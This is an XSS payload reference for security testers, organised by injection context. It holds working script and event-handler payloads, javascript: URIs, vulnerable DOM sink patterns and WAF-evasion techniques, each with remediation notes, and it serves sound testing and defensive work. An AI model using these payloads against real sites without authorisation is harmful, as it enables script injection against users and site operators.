# Cross-Site Scripting (XSS) Payload Reference

This reference is organized by rendering context, since the correct payload depends entirely on where attacker-controlled data lands in the response. Firing an HTML-context payload into a JavaScript-string context (or vice versa) will simply fail and waste testing time — identify context first.

## Table of Contents

- [Purpose](#purpose)
- [Identifying Context](#identifying-context)
- [HTML Body Context](#html-body-context)
- [HTML Attribute Context](#html-attribute-context)
- [JavaScript String Context](#javascript-string-context)
- [URL Context](#url-context)
- [DOM-Based Sinks](#dom-based-sinks)
- [Filter and WAF Bypasses](#filter-and-waf-bypasses)
- [Detection](#detection)
- [References](#references)

## Purpose

This collection helps confirm and demonstrate Cross-Site Scripting across common rendering contexts, and explains *why* each payload works so it can be adapted when the exact listed string is filtered.

## Identifying Context

Before selecting a payload, send a unique, inert marker string (e.g., `zzXSStestzz123`) and view the raw response source to see exactly where and how it's reflected:

| Observed Reflection | Context |
|---|---|
| `<div>zzXSStestzz123</div>` | HTML body |
| `<input value="zzXSStestzz123">` | HTML attribute |
| `var x = "zzXSStestzz123";` | JavaScript string |
| `<a href="zzXSStestzz123">` | URL/attribute |
| Not present in raw HTML, but visible on rendered page | Likely DOM-based — check client-side JS sinks |

## HTML Body Context

**Purpose**: confirm execution when input is reflected directly between HTML tags.

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
```

**Usage**: submit into any field reflected in HTML body position (comments, bios, search results pages, error messages).

**Detection**: a JavaScript `alert()` dialog rendering confirms execution in a live browser test. For automated detection, use a payload that triggers a distinguishable, greppable side effect instead:

```html
<img src=x onerror="document.title='XSS-CONFIRMED-'+Math.random()">
```

**Expected Behaviour**: vulnerable targets render the tag and execute the event handler. Non-vulnerable targets either HTML-encode the input (`&lt;script&gt;`) or strip the tag entirely.

**Bypasses**:
- If `<script>` is blocked but other tags pass through: use `<svg onload=...>` or `<img onerror=...>`, which are non-obvious to naive blocklist filters.
- If `<` and `>` are encoded but the payload still lands in an event-handler-capable position: no bypass needed, use the attribute-context payload instead.
- If common event handlers (`onerror`, `onload`) are blocked: try less common ones (`onpointerenter`, `onanimationstart` combined with a CSS animation).

## HTML Attribute Context

**Purpose**: confirm execution when input lands inside an existing tag's attribute value.

```html
" autofocus onfocus=alert(document.domain) x="
' autofocus onfocus=alert(document.domain) x='
" onmouseover=alert(document.domain) x="
```

**Usage**: submit into fields reflected as an attribute value (e.g., a search box's `value` attribute, a redirect URL used in `href`).

**Detection**: the injected event handler fires either automatically (`autofocus` + `onfocus` fires on page load without user interaction) or on the specified trigger.

**Expected Behaviour**: vulnerable targets allow the quote character to break out of the attribute value, letting the injected `onfocus` become a new, live attribute on the tag. Non-vulnerable targets encode the quote character (`&quot;` / `&#39;`) or strip it.

**Bypasses**:
- If straight double quotes are filtered but the attribute itself is single-quoted, try the single-quote variant.
- If both quote characters are filtered, check whether the attribute value is otherwise unescaped and whether a space-delimited attribute injection works without needing to close the quote at all (rare, but occurs with poorly implemented custom escaping).

## JavaScript String Context

**Purpose**: confirm execution when input is reflected inside an inline `<script>` block as a string literal.

```js
';alert(document.domain);'
";alert(document.domain);"
</script><script>alert(document.domain)</script>
```

**Usage**: submit into fields reflected inside inline JS (commonly configuration objects rendered server-side into the page, e.g., `var config = {"username": "INPUT"};`).

**Detection**: closing the string and statement (`';...;'`) executes the injected statement in the surrounding script context.

**Expected Behaviour**: vulnerable targets pass the value through with only the outer quotes as delimiters, unescaped internally. Non-vulnerable targets JSON-encode or JS-escape the value (`\x27` instead of `'`, or use `JSON.stringify` server-side).

**Bypasses**:
- If straight quotes are escaped but backslashes are not stripped, a trailing unescaped backslash in the input can neutralize the escaping of the following character — test `\';alert(1);'` style constructs case-by-case.
- If the entire `<script>` block is filtered from re-injection, try breaking out of the script tag entirely with `</script><svg onload=alert(1)>`.

## URL Context

**Purpose**: confirm execution via `javascript:` URIs when input controls an `href`, `src`, or redirect target.

```html
javascript:alert(document.domain)
javascript:alert(document.domain)//
data:text/html,<script>alert(document.domain)</script>
```

**Usage**: submit into any field that becomes a clickable link's `href`, or a redirect parameter that sets `window.location`.

**Detection**: requires user interaction (a click) unless the value is used directly in a script-controlled navigation (`window.location = input`), in which case it fires without a click.

**Expected Behaviour**: vulnerable targets accept the `javascript:` scheme unfiltered. Non-vulnerable targets allow-list acceptable URL schemes (`http:`, `https:`, `mailto:`) and reject others.

## DOM-Based Sinks

**Purpose**: confirm execution when a client-side JavaScript sink (not the server response) is the vulnerable point.

Common vulnerable sink patterns to look for during source review:

```js
element.innerHTML = location.hash.substring(1);
document.write(new URLSearchParams(location.search).get('name'));
eval(decodeURIComponent(location.hash.substring(1)));
```

**Usage**: craft a URL fragment or query parameter matching the identified sink's source.

```
https://target.example/page#<img src=x onerror=alert(document.domain)>
```

**Detection**: DOM-based XSS never appears in server response source — it must be confirmed by observing execution in a live browser (or headless browser automation), since the payload never traverses the server at all for fragment-based (`#`) sinks.

**Expected Behaviour**: vulnerable code paths pass the source directly to `innerHTML`, `document.write`, or `eval` without sanitization. Safe patterns use `textContent`, sanitize via an allow-list library, or avoid `eval`/`Function` constructors on user data entirely.

## Filter and WAF Bypasses

| Technique | Example | Why It Works |
|---|---|---|
| Case variation | `<ScRiPt>` | Naive filters match exact-case strings only |
| Null byte / whitespace insertion | `<img src=x onerror=alert(1)>` → `<img sr\tc=x onerror=alert(1)>` | Some parsers tolerate whitespace within attribute names that filters don't account for |
| Encoding | `&#x3c;script&#x3e;` (HTML entity), `%3Cscript%3E` (URL encoding) | Filter checks raw string, but the rendering context decodes before executing |
| Alternate event handlers | `onpointerenter`, `onanimationstart` | Blocklists often only cover the most common handful of handlers |
| Polyglot payloads | `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//` | Designed to survive multiple filtering/encoding layers simultaneously across contexts |

> **Note**
> Always identify *why* a bypass works before using it in a report — "this specific encoding survived because the filter decodes before validating, but validates before storing" is far more useful to a developer than the raw payload string alone.

## References

- PortSwigger XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- OWASP XSS Filter Evasion Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
- DOMPurify (sanitization reference implementation): https://github.com/cure53/DOMPurify
